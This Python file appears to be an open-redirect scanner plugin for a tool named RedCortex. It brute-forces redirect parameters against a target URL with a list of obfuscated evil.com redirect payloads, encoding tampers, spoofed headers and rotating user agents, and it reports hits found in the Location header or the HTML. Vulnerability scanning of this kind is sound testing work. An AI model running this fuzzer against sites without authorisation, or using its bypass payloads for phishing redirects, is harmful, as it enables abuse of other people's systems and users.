"""
RedCortex Plugin: Advanced Open Redirect Detection

Param brute, advanced obfuscated/encoded redirect payloads, method/header rotation, location/HTML content matching.
"""

import requests, random, re

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

REDIRECT_PARAMS = [
    "redirect", "next", "url", "goto", "to", "return", "dest", "out", "data", "callback", "ret", "link", "target", "uri", "returnUrl"
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "////evil.com",
    "///evil.com",
    "https:/evil.com",
    "https:\\evil.com",
    "\\evil.com",
    "https://google.com@evil.com",
    "http:evil.com",
    "http:%2F%2Fevil.com",
    "javascript://evil.com",
    "http://evil.com/?payload=1",
    "//127.0.0.1@evil.com",
    "https:////evil.com",
    "http:////evil.com",
    "/%2F%2Fevil.com"
]

TAMPERS = [
    lambda x: x,
    lambda x: x.replace("https://", "https:/"),
    lambda x: x.replace("evil.com", "evil.com%00.safe.com"),
    lambda x: x.replace("/", "//"),
    lambda x: x.replace("evil.com", "evil.com#safe"),
    lambda x: x.replace("evil.com", "evil.com%2F"),
    lambda x: x.replace("evil.com", "evil.com%0A"),
    lambda x: x.replace("evil.com", "evil.com?redir=true"),
    lambda x: x.replace("http", "hTTp"),
]

REDIRECT_HEADERS = [
    {},
    {"Referer": "https://evil.com"},
    {"Referer": "http://localhost"},
    {"X-Forwarded-Host": "evil.com"},
]

LOCATION_PATTERNS = [
    r"evil\.com", r"google\.com", r"@evil\.com"
]

HTML_PATTERNS = [
    r"http[s]?://evil\.com", r"HREF=[\"']https?://evil\.com", r"window\.location.*evil\.com"
]

def send_req(url, params, headers=None, method="GET"):
    headers = {**{"User-Agent": random.choice(USER_AGENTS)}, **(headers or {})}
    try:
        allow_redirects = False
        if method == "GET":
            resp = requests.get(url, params=params, headers=headers, timeout=10, allow_redirects=allow_redirects)
        else:
            resp = requests.post(url, data=params, headers=headers, timeout=10, allow_redirects=allow_redirects)
        return resp.status_code, resp.text, resp.headers
    except Exception as e:
        return None, str(e), {}

def run(response, url):
    """RedCortex plugin interface; brute open redirect param/payload/tamper/header/method and checks for a redirect."""
    findings = []
    try:
        for param_name in REDIRECT_PARAMS:
            for tamper in TAMPERS:
                for payload in REDIRECT_PAYLOADS:
                    for headers in REDIRECT_HEADERS:
                        for method in ["GET", "POST"]:
                            fuzzed = tamper(payload)
                            params = {param_name: fuzzed}
                            print(f"[*] Open Redirect: {method} param '{param_name}' tamper '{tamper.__name__ if hasattr(tamper,'__name__') else str(tamper)}' payload '{payload}' headers '{headers}'")
                            sc, body, resp_headers = send_req(url, params, headers, method)
                            # Confirm by Location header (most reliable)
                            if "location" in resp_headers:
                                for patt in LOCATION_PATTERNS:
                                    if re.search(patt, resp_headers["location"], re.IGNORECASE):
                                        findings.append({
                                            "type": "OpenRedirect",
                                            "description": f"Location header redirect to payload: param '{param_name}' tamper '{tamper}', value '{fuzzed}'",
                                            "param": param_name,
                                            "payload": fuzzed,
                                            "original_payload": payload,
                                            "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                            "method": method,
                                            "headers": headers,
                                            "severity": "critical",
                                            "url": url,
                                            "location": resp_headers["location"]
                                        })
                                        return findings
                            # Fallback: reflected redirect in HTML
                            for patt in HTML_PATTERNS:
                                if re.search(patt, body, re.IGNORECASE):
                                    findings.append({
                                        "type": "OpenRedirect",
                                        "description": f"HTML/JS redirect/link leak: param '{param_name}' tamper '{tamper}', value '{fuzzed}'",
                                        "param": param_name,
                                        "payload": fuzzed,
                                        "original_payload": payload,
                                        "tamper": tamper.__name__ if hasattr(tamper, "__name__") else str(tamper),
                                        "method": method,
                                        "headers": headers,
                                        "severity": "high",
                                        "url": url,
                                        "evidence": re.findall(patt, body, re.IGNORECASE)
                                    })
                                    return findings
    except KeyboardInterrupt:
        print("[!] Scan interrupted by user.")
        return findings
    return findings
